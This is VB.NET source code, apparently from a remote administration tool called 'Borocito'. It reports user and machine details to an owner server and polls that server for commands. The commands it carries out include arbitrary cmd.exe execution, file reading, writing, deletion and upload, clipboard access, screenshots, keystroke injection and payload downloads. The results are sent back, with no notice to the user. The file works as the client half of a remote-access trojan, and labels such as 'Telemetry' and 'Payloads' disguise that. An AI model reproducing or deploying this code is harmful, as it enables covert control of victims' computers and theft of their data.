Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Threading
Namespace Network
    Module Telemetry
        Public refreshTelemetryThread As Thread = New Thread(New ThreadStart(AddressOf SendRefreshTelemetry))
        Public IsrefreshTelemetryThreadRunning As Boolean = False
        Sub ReportMeToServer()
            Try
                Dim reportContent As String = "#New User Report " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & " Version: " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" &
                vbCrLf & "[User]" &
                vbCrLf & "Status=" & "True" &
                vbCrLf & "Name=" & Environment.UserName &
                vbCrLf & "UID=" & UID &
                vbCrLf & "PC=" & Environment.UserDomainName &
                vbCrLf & "InternalIP=" & "" &
                vbCrLf & "Language=" & My.Computer.Info.InstalledUICulture.NativeName &
                vbCrLf & "Account=" & My.User.Name &
                vbCrLf & "[PC]" &
                vbCrLf & "OS=" & My.Computer.Info.OSFullName & " " & My.Computer.Info.OSVersion &
                vbCrLf & "RAM=" & My.Computer.Info.TotalPhysicalMemory &
                vbCrLf & "Screen=" & My.Computer.Screen.Bounds.ToString & " | (Working area: " & My.Computer.Screen.WorkingArea.ToString & ")" &
                vbCrLf & vbCrLf & vbCrLf
                Dim tlmReviewed As String = reportContent
                If tlmReviewed.Contains("&") Then
                    tlmReviewed = tlmReviewed.Replace("&", "(AndSymb)")
                End If
                Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/userReport.php")
                request.Method = "POST"
                Dim postData As String = "ident=" & UID & "&log=" & tlmReviewed
                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
                request.ContentType = "application/x-www-form-urlencoded"
                request.ContentLength = byteArray.Length
                Dim dataStream As Stream = request.GetRequestStream()
                dataStream.Write(byteArray, 0, byteArray.Length)
                dataStream.Close()
                Dim response As WebResponse = request.GetResponse()
                AddToLog("ReportMeToServer@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
                'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
                'End If
                response.Close()
            Catch ex As Exception
                AddToLog("ReportMeToServer(CreateUser)@Network", "Error: " & ex.Message, True)
                Uninstall()
            End Try
            Try
                'Create CMD file on server
                Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
                request.Method = "POST"
                Dim postData As String = "ident=" & UID & "&text=" & "#Command Channel for Unique User. CMD Created (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
                vbCrLf & "Command1>" &
                vbCrLf & "Command2>" &
                vbCrLf & "Command3>" &
                vbCrLf & "[Response]" &
                vbCrLf
                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
                request.ContentType = "application/x-www-form-urlencoded"
                request.ContentLength = byteArray.Length
                Dim dataStream As Stream = request.GetRequestStream()
                dataStream.Write(byteArray, 0, byteArray.Length)
                dataStream.Close()
                Dim response As WebResponse = request.GetResponse()
                AddToLog("CreateCMDFile@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
                'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
                'End If
                response.Close()
            Catch ex As Exception
                AddToLog("ReportMeToServer(CreateCMD)@Network", "Error: " & ex.Message, True)
                Uninstall()
            End Try
        End Sub
        Sub SendFirstTelemetry()
            Try
                AddToLog("Network", "Sending first telemetry...", False)
                Dim reportContent As String = tlmContent
                Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/telemetryPost.php")
                request.Method = "POST"
                Dim postData As String = "ident=" & UID & "&log=" & reportContent
                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
                request.ContentType = "application/x-www-form-urlencoded"
                request.ContentLength = byteArray.Length
                Dim dataStream As Stream = request.GetRequestStream()
                dataStream.Write(byteArray, 0, byteArray.Length)
                dataStream.Close()
                Dim response As WebResponse = request.GetResponse()
                AddToLog("SendTelemetry@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
                'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
                'End If
                response.Close()
                tlmContent = Nothing
            Catch ex As Exception
                AddToLog("SendTelemetry@Network", "Error: " & ex.Message, True)
            End Try
        End Sub
        Sub SendTelemetry()
            Try
                AddToLog("Network", "Sending telemetry...", False)
                Dim reportContent As String = tlmContent
                reportContent = reportContent.Replace("&", "(AndSymb)")
                Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Telemetry/tlmRefresh.php")
                request.Method = "POST"
                Dim postData As String = "ident=" & UID & "&log=" & reportContent
                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
                request.ContentType = "application/x-www-form-urlencoded"
                request.ContentLength = byteArray.Length
                Dim dataStream As Stream = request.GetRequestStream()
                dataStream.Write(byteArray, 0, byteArray.Length)
                dataStream.Close()
                Dim response As WebResponse = request.GetResponse()
                AddToLog("SendTelemetry@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
                response.Close()
                tlmContent = Nothing
            Catch ex As Exception
                AddToLog("SendTelemetry@Network", "Error: " & ex.Message, True)
            End Try
        End Sub
        Function SendCustomTelemetryFile(ByVal filePath As String, Optional ByVal serverPost As String = Nothing) As String
            Try
                AddToLog("SendCustomTelemetryFile@Network", "Sending file to telemetry...", False)
                If serverPost = Nothing Then
                    My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
                Else
                    My.Computer.Network.UploadFile(filePath, serverPost)
                End If
                Return AddToLog("SendCustomTelemetryFile@Network", "A file was sended as telemetry. " & filePath.Remove(0, filePath.LastIndexOf("\") + 1), False)
            Catch ex As Exception
                Return AddToLog("SendCustomTelemetryFile@Network", "Error: " & ex.Message, True)
            End Try
        End Function
        Sub StartRefreshTelemetry(ByVal StartIt As Boolean)
            Try
                If StartIt Then
                    'Se inicia
                    If IsrefreshTelemetryThreadRunning Then
                        'refreshTelemetryThread.Resume()
                    Else
                        refreshTelemetryThread.Start()
                        IsrefreshTelemetryThreadRunning = True
                    End If
                Else
                    'Se detiene
                    'refreshTelemetryThread.Suspend()
                End If
            Catch ex As Exception
                AddToLog("StartRefreshTelemetry@Network", "Error: " & ex.Message, True)
            End Try
        End Sub
        Sub SendRefreshTelemetry()
            Try
                While True
                    Thread.Sleep(1800000) '30 minutos
                    SendTelemetry()
                End While
            Catch ex As Exception
                AddToLog("SendRefreshTelemetry@Network", "Error: " & ex.Message, True)
            End Try
        End Sub
    End Module
    Module ServerHandle
        Public IsConfigReaderThreadRunning As Boolean = False
        Public ThreadReadGeneralConfigServer As Threading.Thread = New Thread(New ThreadStart(AddressOf ReadConfigFile))
        Sub ConfigFileListenerManager(ByVal active As Boolean)
            Try
                'If active Then
                '    'Activo
                '    If IsConfigReaderThreadRunning Then
                '        ThreadReadGeneralConfigServer.Resume()
                '    Else
                '        ThreadReadGeneralConfigServer.Start()
                '        IsConfigReaderThreadRunning = True
                '    End If
                'Else
                '    'Inactivo
                '    ThreadReadGeneralConfigServer.Suspend()
                'End If
            Catch ex As Exception
                AddToLog("ConfigFileListenerManager@Network", "Error: " & ex.Message, True)
            End Try
        End Sub
        Sub ReadConfigFile()
            Try
                'Hola querido, resulta que esto todavia no esta programado porque
                'forma parte de una actualizacion que esta muy, muy, pero muy en el futuro.
                '(si aplica, puede que no lo haga)
            Catch ex As Exception
                AddToLog("ReadConfigFile@Network", "Error: " & ex.Message, True)
            End Try
        End Sub
        Sub ServerConfigFiles()
            AddToLog("ServerConfigFiles@Network", "Reading server configuration...")
            Try
                'Verificar que el fichero no exista en local
                If My.Computer.FileSystem.FileExists(DIRCommons & "\Client.ini") Then
                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\Client.ini")
                End If
                If My.Computer.FileSystem.FileExists(DIRCommons & "\General.ini") Then
                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\General.ini")
                End If
                If My.Computer.FileSystem.FileExists(DIRCommons & "\Globals.ini") Then
                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\Globals.ini")
                End If
                'Descargar el fichero desde el servidor
                My.Computer.Network.DownloadFile(HttpOwnerServer & "/Client.ini", DIRCommons & "\Client.ini")
                My.Computer.Network.DownloadFile(HttpOwnerServer & "/GlobalSettings.ini", DIRCommons & "\General.ini")
                My.Computer.Network.DownloadFile(HttpOwnerServer & "/Globals.ini", DIRCommons & "\Globals.ini")
            Catch ex As Exception
                AddToLog("ConfigFiles@Network", "Error: " & ex.Message, True)
            End Try
        End Sub
    End Module
    Module CommandManager
        Public IsCommandReaderThreadRunning As Boolean = False
        Public PersistentProccessed As Boolean = False
        Public PersistentCommand As String = Nothing
        Public cmdSetType As SByte = 0
        Public ThreadReadCMDServer As Threading.Thread = New Thread(New ThreadStart(AddressOf GetCommandFile))

        Function SendCommandResponse(Optional ByVal CMDResponse As String = Nothing) As String
            Try
                Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
                request.Method = "POST"
                Dim postData As String = "ident=" & UID & "&text=" & "#Command Channel for Unique User. Responded (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
                vbCrLf & "Command1>" &
                vbCrLf & "Command2>" &
                vbCrLf & "Command3>" & PersistentCommand &
                vbCrLf & "[Response]" &
                vbCrLf & CMDResponse
                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
                request.ContentType = "application/x-www-form-urlencoded"
                request.ContentLength = byteArray.Length
                Dim dataStream As Stream = request.GetRequestStream()
                dataStream.Write(byteArray, 0, byteArray.Length)
                dataStream.Close()
                Dim response As WebResponse = request.GetResponse()
                AddToLog("SendCommandResponse@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
                'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
                'End If
                response.Close()
                Return CMDResponse
            Catch ex As Exception
                Return AddToLog("SendCommandResponse@Network", "Error: " & ex.Message, True)
            End Try
        End Function
        Sub CommandListenerManager(ByVal active As Boolean)
            Try
                If active Then
                    'Activo
                    Boro_Comm.StartServer() 'LLAMA A BORO-COMM A INICIAR LA ESCUCHA TCP/ip
                    If IsCommandReaderThreadRunning Then
                        'ThreadReadCMDServer.Resume()
                    Else
                        ThreadReadCMDServer.Start()
                        IsCommandReaderThreadRunning = True
                    End If
                Else
                    'Inactivo
                    'ThreadReadCMDServer.Suspend()
                End If
            Catch ex As Exception
                AddToLog("CommandListenerManager@Network", "Error: " & ex.Message, True)
            End Try
        End Sub

        Sub GetCommandFile()
            While True
                Try
                    Dim LocalCommandFile As String = DIRCommons & "\[" & UID & "]Command.str"
                    Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
                    Thread.Sleep(5000) '5 segundos (despues deben ser 10)
                    If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
                        My.Computer.FileSystem.DeleteFile(LocalCommandFile)
                    End If
                    My.Computer.Network.DownloadFile(RemoteCommandFile, LocalCommandFile)
                    'Leer
                    Dim TextBoxVR As New TextBox With {
                        .Text = My.Computer.FileSystem.ReadAllText(LocalCommandFile)
                    }
                    Dim Lineas = TextBoxVR.Lines
                    ReadCommandFile(Lineas)
                Catch ex As Exception
                    AddToLog("GetCommandFile@Network", "Error: " & ex.Message, True)
                End Try
            End While
        End Sub
        Sub ReadCommandFile(ByVal commandFormat As String())
            Try
                Dim Lineas = commandFormat
                Dim CommandResponse As String = Nothing

                Dim CMD1 As String = Lineas(1).Split(">"c)(1).Trim() 'Comando principal
                Dim CMD2 As String = Lineas(2).Split(">"c)(1).Trim() 'Comando secundario
                Dim CMD3 As String = Lineas(3).Split(">"c)(1).Trim() 'Comando persistente
                Dim PersistentesCMD() As String = CMD3.Split("|")
                PersistentCommand = CMD3

                'Las respuestas generadas por cada comando deben ser concatenadas con la respuesta del anterior, luego de eso, debe ser enviada.
                '   Asi se mostrara la respuesta (separada por cada linea) de cada comando

                If CMD1 <> Nothing Then
                    CommandResponse = CommandManager(CMD1)
                    If CMD1 = Nothing Then
                    Else
                        If CommandResponse = Nothing Then
                            SendCommandResponse("Ejecuted " & CMD1 & " " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy")) 'ENVIAR RESPUESTA
                        Else
                            SendCommandResponse(CommandResponse)
                        End If
                    End If
                End If

                If CMD2 <> Nothing Then
                    CommandResponse &= vbCrLf & CommandManager(CMD2)
                    If CMD2 = Nothing Then
                    Else
                        If CommandResponse = Nothing Then
                            SendCommandResponse("Ejecuted Secundary " & CMD2 & " " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy")) 'ENVIAR RESPUESTA
                        Else
                            SendCommandResponse(CommandResponse)
                        End If
                    End If
                End If

                If Not PersistentProccessed Then 'Solo procesa por instancia (una vez)
                    If CMD3 <> Nothing Then
                        For Each comando As String In PersistentesCMD
                            CommandResponse &= vbCrLf & CommandManager(comando)
                        Next
                        If CMD3 = Nothing Then
                        Else
                            If CommandResponse = Nothing Then
                                SendCommandResponse("Ejecuted Persistent " & CMD3 & " " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy")) 'ENVIAR RESPUESTA
                            Else
                                SendCommandResponse(CommandResponse)
                            End If
                        End If
                        PersistentProccessed = True
                    End If
                End If
            Catch ex As Exception
                AddToLog("ReadCommandFile@Network", "Error: " & ex.Message, True)
            End Try
        End Sub
        Function CommandManager(ByVal command As String) As String
            AddToLog("CommandManager@Network", "Query: " & command, False)
            Dim respuesta As String = ProccessCommand(command)
            AddToLog("CommandManager@Network", "Response: " & respuesta, False)
            'SendCommandResponse(respuesta)
            Return respuesta
        End Function
        Function ProccessCommand(ByVal command As String) As String
            Try
                Dim CommandCMD As String = command
                If CommandCMD.Contains("=") Then
                    CommandCMD = CommandCMD.Remove(0, CommandCMD.LastIndexOf("=") + 1)
                End If
                If CommandCMD.Contains("%username%") Then
                    CommandCMD = CommandCMD.Replace("%username%", Environment.UserName)
                End If
                If command.StartsWith("MsgBox=") Then
                    Dim Arg() As String = CommandCMD.Split(",")
                    If My.Computer.FileSystem.FileExists(DIRTemp & "\MessageBoxBRO.vbs") Then
                        My.Computer.FileSystem.DeleteFile(DIRTemp & "\MessageBoxBRO.vbs")
                    End If
                    My.Computer.FileSystem.WriteAllText(DIRTemp & "\MessageBoxBRO.vbs", "a = MsgBox(" & """" & Arg(0) & """" & "," & Arg(1) & "," & """" & Arg(2) & """" & ")", False, Encoding.ASCII)
                    Process.Start(DIRTemp & "\MessageBoxBRO.vbs")

                ElseIf command.StartsWith("/Pause=") Then
                    Boro_Comm.Connector.SendMesssage(SendCommandResponse("Borocito has been paused for '" & CommandCMD & "' ms"))
                    Threading.Thread.Sleep(CommandCMD)

                ElseIf command = "/Memory.Save()" Then
                    SaveRegedit()
                ElseIf command = "/Memory.Load()" Then
                    LoadRegedit()

                    '<--- Windows --->
                ElseIf command.StartsWith("/Windows.Process.Start=") Then
                    Dim Arg() As String = CommandCMD.Split(",")
                    Return ProcessStart(Arg(0), Arg(1))

                ElseIf command.StartsWith("/Windows.Process.Stop=") Then
                    Return ProcessStop(CommandCMD)

                ElseIf command.StartsWith("/Windows.Process.Get") Then
                    If command.Contains("'") Then
                        Return ProcessGet(command.Split("'")(1))
                    Else
                        Return ProcessGet()
                    End If

                ElseIf command.StartsWith("/Windows.FileSystem.GetDirectory=") Then
                    Return FileSystemGetDirectory(CommandCMD)

                ElseIf command.StartsWith("/Windows.FileSystem.GetFiles=") Then
                    Return FileSystemGetFiles(CommandCMD)

                ElseIf command.StartsWith("/Windows.FileSystem.Read=") Then
                    Return FileSystemRead(CommandCMD)

                ElseIf command.StartsWith("/Windows.FileSystem.Write=") Then
                    Dim Arg() As String = CommandCMD.Split(",")
                    Return FileSystemWrite(Arg(0), Arg(1), Arg(2))

                ElseIf command.StartsWith("/Windows.FileSystem.DirCreate=") Then
                    Return FileSystemDirCreate(CommandCMD)

                ElseIf command.StartsWith("/Windows.FileSystem.Delete=") Then
                    Return FileSystemDelete(CommandCMD)

                ElseIf command.StartsWith("/Windows.Clipboard.Set=") Then
                    Return ClipboardSet(CommandCMD)

                ElseIf command.StartsWith("/Windows.Clipboard.Get()") Then
                    Return ClipboardGet()

                ElseIf command.StartsWith("/Windows.System.GetHost()") Then
                    Return SystemGetHost()

                    '<--- Payloads --->
                ElseIf command.StartsWith("/Payloads.DownloadComponent=") Then 'Funciona.
                    Dim Arg() As String = CommandCMD.Split(",")
                    Return Payloads.DownloadComponent(Arg(0), Arg(1), Boolean.Parse(Arg(2)), Arg(3), Arg(4))

                ElseIf command.StartsWith("/Payloads.Upload.File=") Then 'Funciona.
                    Dim Arg() As String = CommandCMD.Split(",")
                    Return Payloads.uploadAfile(Arg(0), Arg(1))

                ElseIf command.StartsWith("/Payloads.SendTheKeys=") Then 'Funciona.
                    Dim Arg() As String = CommandCMD.Split(",")
                    Return Payloads.SendTheKeys(Arg(0), Arg(1))

                ElseIf command.StartsWith("/Payloads.TakeScreenshot()") Then 'Funciona.
                    Return Payloads.TakeAnScreenshot()

                ElseIf command.StartsWith("/Payloads.Inputs=") Then 'Funciona.
                    Return Payloads.Inputs(CommandCMD)

                ElseIf command.StartsWith("/Payloads.PostNotify=") Then 'Funciona.
                    Dim Arg() As String = CommandCMD.Split(",")
                    Return Payloads.PostNotify(Arg(0), Arg(1), Arg(2), Arg(3), Arg(4))

                    '<--- Borocito Tools --->
                ElseIf command.StartsWith("/Stop") Then 'Funciona.
                    AddToLog("Network", Boro_Comm.Connector.SendMesssage(SendCommandResponse("Borocito has been called to close")), True)
                    SendTelemetry()
                    Stopit()

                ElseIf command.StartsWith("/Restart") Then 'Funciona.
                    AddToLog("Network", "Borocito has been called to restart", True)
                    SendTelemetry()
                    Restart()
                    Return "Borocito has been called to restart!"

                ElseIf command.StartsWith("/Uninstall") Then 'Funciona.
                    AddToLog("Network", Boro_Comm.Connector.SendMesssage(SendCommandResponse("Borocito has been called to uninstall. Goodbye")), True)
                    SendTelemetry()
                    Uninstall()

                ElseIf command.StartsWith("/Update") Then 'Funciona.
                    AddToLog("Network", "Borocito has been called to Update", True)
                    SendTelemetry()
                    Update()
                    Return "Borocito has been called to Update!"

                ElseIf command.StartsWith("/ForceUpdate") Then 'Funciona.
                    AddToLog("Network", "Borocito has been called to Force the Update", True)
                    SendTelemetry()
                    Update("/ForceUpdate")
                    Return "Borocito has been called to Force the Update!"

                ElseIf command.StartsWith("/Reset") Then 'Funciona.
                    AddToLog("Network", Boro_Comm.Connector.SendMesssage(SendCommandResponse("Borocito has been called to Reset")), True)
                    SendTelemetry()
                    Extractor()

                ElseIf command.StartsWith("/SendTelemetry") Then 'Funciona.
                    AddToLog("Network", "Borocito has been called to send telemetry!", True)
                    SendTelemetry()
                    Return "Sending located telemetry..."

                ElseIf command.StartsWith("/Heartbeat") Then 'Funciona.
                    AddToLog("Network", "Hey, Im here!", True)
                    Return "---/\--- (Pum pum...)" &
                    vbCrLf & "[VARIABLES]" &
                    vbCrLf & compileVersion &
                    vbCrLf & "DIRCommons: " & DIRCommons &
                    vbCrLf & "DIRTemp: " & DIRTemp &
                    vbCrLf & "parameters: " & parameters &
                    vbCrLf & "HttpOwnerServer: " & HttpOwnerServer &
                    vbCrLf & "OwnerServer: " & OwnerServer &
                    vbCrLf & "UID: " & UID &
                    vbCrLf & "MyCommandProcessor: " & MyCommandProcessor &
                    vbCrLf & "IsrefreshTelemetryThreadRunning: " & IsrefreshTelemetryThreadRunning &
                    vbCrLf & "IsCommandReaderThreadRunning: " & IsCommandReaderThreadRunning &
                    vbCrLf & "IsConfigReaderThreadRunning: " & IsConfigReaderThreadRunning &
                    vbCrLf & "PersistentProccessed: " & PersistentProccessed &
                    vbCrLf & "PersistentCommand: " & PersistentCommand &
                    vbCrLf & "cmdSetType: " & cmdSetType &
                    vbCrLf & "[COMPUTER]" &
                    vbCrLf & "UserDomainName: " & Environment.UserDomainName &
                    vbCrLf & "RAM: " & My.Computer.Info.AvailablePhysicalMemory & "/" &
                    My.Computer.Info.AvailableVirtualMemory & "/" &
                    My.Computer.Info.TotalPhysicalMemory & "/" &
                    My.Computer.Info.TotalVirtualMemory

                ElseIf command.StartsWith("/Status") Then 'Funciona.
                    Return My.Application.Info.AssemblyName & " v" & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & "). Running in " & Environment.UserDomainName & "\" & Environment.UserName

                ElseIf command.StartsWith("boro-get") Then 'Funciona.
                    Return Boro_Get.BORO_GET_ADMIN(command)

                ElseIf command.ToLower = "<set cmd default" Then
                    cmdSetType = 0
                    Return "Default command processor changed to 'default'"
                ElseIf command.ToLower = "<set cmd cmd" Then
                    cmdSetType = 1
                    Return "Default command processor changed to 'Console'"
                ElseIf command.ToLower = "<set cmd process" Then
                    cmdSetType = 2
                    Return "Default command processor changed to 'Process'"
                ElseIf command.ToLower = "<set cmd boro-get" Then
                    cmdSetType = 3
                    Return "Default command processor changed to 'boro-get'"
                ElseIf command.ToLower Like "*<set cmd own*" Then
                    Dim args() As String = command.Split(" ")
                    If args.Count > 3 Then
                        MyCommandProcessor = args(3)
                    End If
                    cmdSetType = 4
                    Return "Default command processor changed to 'own' in '" & MyCommandProcessor & "'"
                Else
                    Select Case cmdSetType
                        Case 1
                            Process.Start("cmd.exe", "/c " & command)
                            Return "Starting cmd under '" & command & "' argument..."
                        Case 2
                            Process.Start(command)
                            Return "Starting '" & command & "'..."
                        Case 3
                            Dim args() As String = command.Split(" ")
                            Dim comandoAux As String = Nothing
                            For i As Integer = 1 To args.Count - 1
                                comandoAux &= " " & args(i)
                            Next
                            Return Boro_Get.BORO_GET_ADMIN(args(0) & " True " & comandoAux.TrimStart())
                        Case 4
                            Return AnotherCommandProcessor(command)
                        Case Else
                            Return "Can't do that!"
                    End Select
                End If
            Catch ex As Exception
                AddToLog("ProccessCommand@Network", "Error: " & ex.Message, True)
                Return "[" & command & "]Error: " & ex.Message
            End Try
            Return Nothing
        End Function
    End Module
End Namespace
